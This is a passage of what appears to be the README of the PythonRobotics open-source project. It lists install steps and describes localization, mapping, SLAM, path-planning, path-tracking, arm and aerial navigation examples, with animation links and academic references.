 &lt;li&gt; &lt;p&gt;&lt;a href="https://www.sphinx-doc.org/"&gt;sphinx&lt;/a&gt; (for document generation)&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://pypi.org/project/pycodestyle/"&gt;pycodestyle&lt;/a&gt; (for code style check)&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Documentation (Textbook)&lt;/h1&gt; 
&lt;p&gt;This README only shows some examples of this project.&lt;/p&gt; 
&lt;p&gt;If you are interested in other examples or mathematical backgrounds of each algorithm,&lt;/p&gt; 
&lt;p&gt;You can check the full documentation (textbook) online: &lt;a href="https://atsushisakai.github.io/PythonRobotics/index.html"&gt;Welcome to PythonRobotics‚Äôs documentation! ‚Äî PythonRobotics documentation&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;All animation gifs are stored here: &lt;a href="https://github.com/AtsushiSakai/PythonRoboticsGifs"&gt;AtsushiSakai/PythonRoboticsGifs: Animation gifs of PythonRobotics&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;How to use&lt;/h1&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;Clone this repo.&lt;/p&gt; &lt;pre&gt;&lt;code class="language-terminal"&gt;git clone https://github.com/AtsushiSakai/PythonRobotics.git
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Install the required libraries.&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;using conda :&lt;/p&gt; &lt;pre&gt;&lt;code class="language-terminal"&gt;conda env create -f requirements/environment.yml
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;using pip :&lt;/p&gt; &lt;pre&gt;&lt;code class="language-terminal"&gt;pip install -r requirements/requirements.txt
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;ol start="3"&gt; 
 &lt;li&gt; &lt;p&gt;Execute python script in each directory.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Add star to this repo if you like it &lt;span&gt;üòÉ&lt;/span&gt;.&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h1&gt;Localization&lt;/h1&gt; 
&lt;h2&gt;Extended Kalman Filter localization&lt;/h2&gt; 
&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/Localization/extended_kalman_filter/animation.gif" width="640" alt="EKF pic" /&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://atsushisakai.github.io/PythonRobotics/modules/2_localization/extended_kalman_filter_localization_files/extended_kalman_filter_localization.html"&gt;documentation&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Particle filter localization&lt;/h2&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/Localization/particle_filter/animation.gif" alt="2" /&gt;&lt;/p&gt; 
&lt;p&gt;This is a sensor fusion localization with Particle Filter(PF).&lt;/p&gt; 
&lt;p&gt;The blue line is true trajectory, the black line is dead reckoning trajectory,&lt;/p&gt; 
&lt;p&gt;and the red line is an estimated trajectory with PF.&lt;/p&gt; 
&lt;p&gt;It is assumed that the robot can measure a distance from landmarks (RFID).&lt;/p&gt; 
&lt;p&gt;These measurements are used for PF localization.&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="http://www.probabilistic-robotics.org/"&gt;PROBABILISTIC ROBOTICS&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Histogram filter localization&lt;/h2&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/Localization/histogram_filter/animation.gif" alt="3" /&gt;&lt;/p&gt; 
&lt;p&gt;This is a 2D localization example with Histogram filter.&lt;/p&gt; 
&lt;p&gt;The red cross is true position, black points are RFID positions.&lt;/p&gt; 
&lt;p&gt;The blue grid shows a position probability of histogram filter.&lt;/p&gt; 
&lt;p&gt;In this simulation, x,y are unknown, yaw is known.&lt;/p&gt; 
&lt;p&gt;The filter integrates speed input and range observations from RFID for localization.&lt;/p&gt; 
&lt;p&gt;Initial position is not needed.&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="http://www.probabilistic-robotics.org/"&gt;PROBABILISTIC ROBOTICS&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Mapping&lt;/h1&gt; 
&lt;h2&gt;Gaussian grid map&lt;/h2&gt; 
&lt;p&gt;This is a 2D Gaussian grid mapping example.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/Mapping/gaussian_grid_map/animation.gif" alt="2" /&gt;&lt;/p&gt; 
&lt;h2&gt;Ray casting grid map&lt;/h2&gt; 
&lt;p&gt;This is a 2D ray casting grid mapping example.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/Mapping/raycasting_grid_map/animation.gif" alt="2" /&gt;&lt;/p&gt; 
&lt;h2&gt;Lidar to grid map&lt;/h2&gt; 
&lt;p&gt;This example shows how to convert a 2D range measurement to a grid map.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/Mapping/lidar_to_grid_map/animation.gif" alt="2" /&gt;&lt;/p&gt; 
&lt;h2&gt;k-means object clustering&lt;/h2&gt; 
&lt;p&gt;This is a 2D object clustering with k-means algorithm.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/Mapping/kmeans_clustering/animation.gif" alt="2" /&gt;&lt;/p&gt; 
&lt;h2&gt;Rectangle fitting&lt;/h2&gt; 
&lt;p&gt;This is a 2D rectangle fitting for vehicle detection.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/Mapping/rectangle_fitting/animation.gif" alt="2" /&gt;&lt;/p&gt; 
&lt;h1&gt;SLAM&lt;/h1&gt; 
&lt;p&gt;Simultaneous Localization and Mapping(SLAM) examples&lt;/p&gt; 
&lt;h2&gt;Iterative Closest Point (ICP) Matching&lt;/h2&gt; 
&lt;p&gt;This is a 2D ICP matching example with singular value decomposition.&lt;/p&gt; 
&lt;p&gt;It can calculate a rotation matrix, and a translation vector between points and points.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/SLAM/iterative_closest_point/animation.gif" alt="3" /&gt;&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://cs.gmu.edu/~kosecka/cs685/cs685-icp.pdf"&gt;Introduction to Mobile Robotics: Iterative Closest Point Algorithm&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;FastSLAM 1.0&lt;/h2&gt; 
&lt;p&gt;This is a feature based SLAM example using FastSLAM 1.0.&lt;/p&gt; 
&lt;p&gt;The blue line is ground truth, the black line is dead reckoning, the red line is the estimated trajectory with FastSLAM.&lt;/p&gt; 
&lt;p&gt;The red points are particles of FastSLAM.&lt;/p&gt; 
&lt;p&gt;Black points are landmarks, blue crosses are estimated landmark positions by FastSLAM.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/SLAM/FastSLAM1/animation.gif" alt="3" /&gt;&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="http://www.probabilistic-robotics.org/"&gt;PROBABILISTIC ROBOTICS&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="http://www-personal.acfr.usyd.edu.au/tbailey/software/slam_simulations.htm"&gt;SLAM simulations by Tim Bailey&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Path Planning&lt;/h1&gt; 
&lt;h2&gt;Dynamic Window Approach&lt;/h2&gt; 
&lt;p&gt;This is a 2D navigation sample code with Dynamic Window Approach.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.ri.cmu.edu/pub_files/pub1/fox_dieter_1997_1/fox_dieter_1997_1.pdf"&gt;The Dynamic Window Approach to Collision Avoidance&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/DynamicWindowApproach/animation.gif" alt="2" /&gt;&lt;/p&gt; 
&lt;h2&gt;Grid based search&lt;/h2&gt; 
&lt;h3&gt;Dijkstra algorithm&lt;/h3&gt; 
&lt;p&gt;This is a 2D grid based the shortest path planning with Dijkstra's algorithm.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/Dijkstra/animation.gif" alt="PythonRobotics/figure_1.png at master ¬∑ AtsushiSakai/PythonRobotics" /&gt;&lt;/p&gt; 
&lt;p&gt;In the animation, cyan points are searched nodes.&lt;/p&gt; 
&lt;h3&gt;A* algorithm&lt;/h3&gt; 
&lt;p&gt;This is a 2D grid based the shortest path planning with A star algorithm.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/AStar/animation.gif" alt="PythonRobotics/figure_1.png at master ¬∑ AtsushiSakai/PythonRobotics" /&gt;&lt;/p&gt; 
&lt;p&gt;In the animation, cyan points are searched nodes.&lt;/p&gt; 
&lt;p&gt;Its heuristic is 2D Euclid distance.&lt;/p&gt; 
&lt;h3&gt;D* algorithm&lt;/h3&gt; 
&lt;p&gt;This is a 2D grid based the shortest path planning with D star algorithm.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/DStar/animation.gif" alt="figure at master ¬∑ nirnayroy/intelligentrobotics" /&gt;&lt;/p&gt; 
&lt;p&gt;The animation shows a robot finding its path avoiding an obstacle using the D* search algorithm.&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/D*"&gt;D* Algorithm Wikipedia&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;D* Lite algorithm&lt;/h3&gt; 
&lt;p&gt;This algorithm finds the shortest path between two points while rerouting when obstacles are discovered. It has been implemented here for a 2D grid.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/DStarLite/animation.gif" alt="D* Lite" /&gt;&lt;/p&gt; 
&lt;p&gt;The animation shows a robot finding its path and rerouting to avoid obstacles as they are discovered using the D* Lite search algorithm.&lt;/p&gt; 
&lt;p&gt;Refs:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="http://idm-lab.org/bib/abstracts/papers/aaai02b.pdf"&gt;D* Lite&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="http://www.cs.cmu.edu/~maxim/files/dlite_icra02.pdf"&gt;Improved Fast Replanning for Robot Navigation in Unknown Terrain&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Potential Field algorithm&lt;/h3&gt; 
&lt;p&gt;This is a 2D grid based path planning with Potential Field algorithm.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/PotentialFieldPlanning/animation.gif" alt="PotentialField" /&gt;&lt;/p&gt; 
&lt;p&gt;In the animation, the blue heat map shows potential value on each grid.&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.cs.cmu.edu/~motionplanning/lecture/Chap4-Potential-Field_howie.pdf"&gt;Robotic Motion Planning:Potential Functions&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Grid based coverage path planning&lt;/h3&gt; 
&lt;p&gt;This is a 2D grid based coverage path planning simulation.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/GridBasedSweepCPP/animation.gif" alt="PotentialField" /&gt;&lt;/p&gt; 
&lt;h3&gt;Particle Swarm Optimization (PSO)&lt;/h3&gt; 
&lt;p&gt;This is a 2D path planning simulation using the Particle Swarm Optimization algorithm.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/ParticleSwarmOptimization/animation.gif" alt="PSO" /&gt;&lt;/p&gt; 
&lt;p&gt;PSO is a metaheuristic optimization algorithm inspired by bird flocking behavior. In path planning, particles explore the search space to find collision-free paths while avoiding obstacles.&lt;/p&gt; 
&lt;p&gt;The animation shows particles (blue dots) converging towards the optimal path (yellow line) from start (green area) to goal (red star).&lt;/p&gt; 
&lt;p&gt;References&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/Particle_swarm_optimization"&gt;Particle swarm optimization - Wikipedia&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://ieeexplore.ieee.org/document/488968"&gt;Kennedy, J.; Eberhart, R. (1995). "Particle Swarm Optimization"&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;State Lattice Planning&lt;/h2&gt; 
&lt;p&gt;This script is a path planning code with state lattice planning.&lt;/p&gt; 
&lt;p&gt;This code uses the model predictive trajectory generator to solve boundary problem.&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://journals.sagepub.com/doi/pdf/10.1177/0278364906075328"&gt;Optimal rough terrain trajectory generation for wheeled mobile robots&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://www.cs.cmu.edu/~alonzo/pubs/papers/JFR_08_SS_Sampling.pdf"&gt;State Space Sampling of Feasible Motions for High-Performance Mobile Robot Navigation in Complex Environments&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Biased polar sampling&lt;/h3&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/StateLatticePlanner/BiasedPolarSampling.gif" alt="PythonRobotics/figure_1.png at master ¬∑ AtsushiSakai/PythonRobotics" /&gt;&lt;/p&gt; 
&lt;h3&gt;Lane sampling&lt;/h3&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/StateLatticePlanner/LaneSampling.gif" alt="PythonRobotics/figure_1.png at master ¬∑ AtsushiSakai/PythonRobotics" /&gt;&lt;/p&gt; 
&lt;h2&gt;Probabilistic Road-Map (PRM) planning&lt;/h2&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/ProbabilisticRoadMap/animation.gif" alt="PRM" /&gt;&lt;/p&gt; 
&lt;p&gt;This PRM planner uses Dijkstra method for graph search.&lt;/p&gt; 
&lt;p&gt;In the animation, blue points are sampled points,&lt;/p&gt; 
&lt;p&gt;Cyan crosses means searched points with Dijkstra method,&lt;/p&gt; 
&lt;p&gt;The red line is the final path of PRM.&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Probabilistic_roadmap"&gt;Probabilistic roadmap - Wikipedia&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;„ÄÄ„ÄÄ&lt;/p&gt; 
&lt;h2&gt;Rapidly-Exploring Random Trees (RRT)&lt;/h2&gt; 
&lt;h3&gt;RRT*&lt;/h3&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/RRTstar/animation.gif" alt="PythonRobotics/figure_1.png at master ¬∑ AtsushiSakai/PythonRobotics" /&gt;&lt;/p&gt; 
&lt;p&gt;This is a path planning code with RRT*&lt;/p&gt; 
&lt;p&gt;Black circles are obstacles, green line is a searched tree, red crosses are start and goal positions.&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://arxiv.org/abs/1005.0416"&gt;Incremental Sampling-based Algorithms for Optimal Motion Planning&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://citeseerx.ist.psu.edu/document?repid=rep1&amp;amp;type=pdf&amp;amp;doi=bddbc99f97173430aa49a0ada53ab5bade5902fa"&gt;Sampling-based Algorithms for Optimal Motion Planning&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;RRT* with reeds-shepp path&lt;/h3&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/RRTStarReedsShepp/animation.gif" alt="Robotics/animation.gif at master ¬∑ AtsushiSakai/PythonRobotics" /&gt;&lt;/p&gt; 
&lt;p&gt;Path planning for a car robot with RRT* and reeds shepp path planner.&lt;/p&gt; 
&lt;h3&gt;LQR-RRT*&lt;/h3&gt; 
&lt;p&gt;This is a path planning simulation with LQR-RRT*.&lt;/p&gt; 
&lt;p&gt;A double integrator motion model is used for LQR local planner.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/LQRRRTStar/animation.gif" alt="LQR_RRT" /&gt;&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://lis.csail.mit.edu/pubs/perez-icra12.pdf"&gt;LQR-RRT*: Optimal Sampling-Based Motion Planning with Automatically Derived Extension Heuristics&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/MahanFathi/LQR-RRTstar"&gt;MahanFathi/LQR-RRTstar: LQR-RRT* method is used for random motion planning of a simple pendulum in its phase plot&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Quintic polynomials planning&lt;/h2&gt; 
&lt;p&gt;Motion planning with quintic polynomials.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/QuinticPolynomialsPlanner/animation.gif" alt="2" /&gt;&lt;/p&gt; 
&lt;p&gt;It can calculate a 2D path, velocity, and acceleration profile based on quintic polynomials.&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://ieeexplore.ieee.org/document/637936/"&gt;Local Path Planning And Motion Control For Agv In Positioning&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Reeds Shepp planning&lt;/h2&gt; 
&lt;p&gt;A sample code with Reeds Shepp path planning.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/ReedsSheppPath/animation.gif?raw=true" alt="RSPlanning" /&gt;&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="http://planning.cs.uiuc.edu/node822.html"&gt;15.3.2 Reeds-Shepp Curves&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://pdfs.semanticscholar.org/932e/c495b1d0018fd59dee12a0bf74434fac7af4.pdf"&gt;optimal paths for a car that goes both forwards and backwards&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/ghliu/pyReedsShepp"&gt;ghliu/pyReedsShepp: Implementation of Reeds Shepp curve.&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;LQR based path planning&lt;/h2&gt; 
&lt;p&gt;A sample code using LQR based path planning for double integrator model.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/LQRPlanner/animation.gif?raw=true" alt="RSPlanning" /&gt;&lt;/p&gt; 
&lt;h2&gt;Optimal Trajectory in a Frenet Frame&lt;/h2&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathPlanning/FrenetOptimalTrajectory/animation.gif" alt="3" /&gt;&lt;/p&gt; 
&lt;p&gt;This is optimal trajectory generation in a Frenet Frame.&lt;/p&gt; 
&lt;p&gt;The cyan line is the target course and black crosses are obstacles.&lt;/p&gt; 
&lt;p&gt;The red line is the predicted path.&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://www.researchgate.net/profile/Moritz_Werling/publication/224156269_Optimal_Trajectory_Generation_for_Dynamic_Street_Scenarios_in_a_Frenet_Frame/links/54f749df0cf210398e9277af.pdf"&gt;Optimal Trajectory Generation for Dynamic Street Scenarios in a Frenet Frame&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=Cj6tAQe7UCY"&gt;Optimal trajectory generation for dynamic street scenarios in a Frenet Frame&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Path Tracking&lt;/h1&gt; 
&lt;h2&gt;move to a pose control&lt;/h2&gt; 
&lt;p&gt;This is a simulation of moving to a pose control&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/Control/move_to_pose/animation.gif" alt="2" /&gt;&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://link.springer.com/book/10.1007/978-3-642-20144-8"&gt;P. I. Corke, "Robotics, Vision and Control" | SpringerLink p102&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Stanley control&lt;/h2&gt; 
&lt;p&gt;Path tracking simulation with Stanley steering control and PID speed control.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathTracking/stanley_controller/animation.gif" alt="2" /&gt;&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="http://robots.stanford.edu/papers/thrun.stanley05.pdf"&gt;Stanley: The robot that won the DARPA grand challenge&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://www.ri.cmu.edu/pub_files/2009/2/Automatic_Steering_Methods_for_Autonomous_Automobile_Path_Tracking.pdf"&gt;Automatic Steering Methods for Autonomous Automobile Path Tracking&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Rear wheel feedback control&lt;/h2&gt; 
&lt;p&gt;Path tracking simulation with rear wheel feedback steering control and PID speed control.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathTracking/rear_wheel_feedback/animation.gif" alt="PythonRobotics/figure_1.png at master ¬∑ AtsushiSakai/PythonRobotics" /&gt;&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://arxiv.org/abs/1604.07446"&gt;A Survey of Motion Planning and Control Techniques for Self-driving Urban Vehicles&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Linear‚Äìquadratic regulator (LQR) speed and steering control&lt;/h2&gt; 
&lt;p&gt;Path tracking simulation with LQR speed and steering control.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathTracking/lqr_speed_steer_control/animation.gif" alt="3" /&gt;&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://ieeexplore.ieee.org/document/5940562/"&gt;Towards fully autonomous driving: Systems and algorithms - IEEE Conference Publication&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Model predictive speed and steering control&lt;/h2&gt; 
&lt;p&gt;Path tracking simulation with iterative linear model predictive speed and steering control.&lt;/p&gt; 
&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathTracking/model_predictive_speed_and_steer_control/animation.gif" width="640" alt="MPC pic" /&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://atsushisakai.github.io/PythonRobotics/modules/6_path_tracking/model_predictive_speed_and_steering_control/model_predictive_speed_and_steering_control.html"&gt;documentation&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="http://grauonline.de/wordpress/?page_id=3244"&gt;Real-time Model Predictive Control (MPC), ACADO, Python | Work-is-Playing&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Nonlinear Model predictive control with C-GMRES&lt;/h2&gt; 
&lt;p&gt;A motion planning and path tracking simulation with NMPC of C-GMRES&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/PathTracking/cgmres_nmpc/animation.gif" alt="3" /&gt;&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://atsushisakai.github.io/PythonRobotics/modules/6_path_tracking/cgmres_nmpc/cgmres_nmpc.html"&gt;documentation&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Arm Navigation&lt;/h1&gt; 
&lt;h2&gt;N joint arm to point control&lt;/h2&gt; 
&lt;p&gt;N joint arm to a point control simulation.&lt;/p&gt; 
&lt;p&gt;This is an interactive simulation.&lt;/p&gt; 
&lt;p&gt;You can set the goal position of the end effector with left-click on the plotting area.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/ArmNavigation/n_joint_arm_to_point_control/animation.gif" alt="3" /&gt;&lt;/p&gt; 
&lt;p&gt;In this simulation N = 10, however, you can change it.&lt;/p&gt; 
&lt;h2&gt;Arm navigation with obstacle avoidance&lt;/h2&gt; 
&lt;p&gt;Arm navigation with obstacle avoidance simulation.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/ArmNavigation/arm_obstacle_navigation/animation.gif" alt="3" /&gt;&lt;/p&gt; 
&lt;h1&gt;Aerial Navigation&lt;/h1&gt; 
&lt;h2&gt;drone 3d trajectory following&lt;/h2&gt; 
&lt;p&gt;This is a 3d trajectory following simulation for a quadrotor.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/AerialNavigation/drone_3d_trajectory_following/animation.gif" alt="3" /&gt;&lt;/p&gt; 
&lt;h2&gt;rocket powered landing&lt;/h2&gt; 
&lt;p&gt;This is a 3d trajectory generation simulation for a rocket powered landing.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/AerialNavigation/rocket_powered_landing/animation.gif" alt="3" /&gt;&lt;/p&gt; 
&lt;p&gt;Reference&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://atsushisakai.github.io/PythonRobotics/modules/8_aerial_navigation/rocket_powered_landing/rocket_powered_landing.html"&gt;documentation&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Bipedal&lt;/h1&gt; 
&lt;h2&gt;bipedal planner with inverted pendulum&lt;/h2&gt; 
&lt;p&gt;This is a bipedal planner for modifying footsteps for an inverted pendulum.&lt;/p&gt; 
&lt;p&gt;You can set the footsteps, and the planner will modify those automatically.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRoboticsGifs/raw/master/Bipedal/bipedal_planner/animation.gif" alt="3" /&gt;&lt;/p&gt; 
&lt;h1&gt;License&lt;/h1&gt; 
&lt;p&gt;MIT&lt;/p&gt; 
&lt;h1&gt;Use-case&lt;/h1&gt; 
&lt;p&gt;If this project helps your robotics project, please let me know with creating an issue.&lt;/p&gt; 
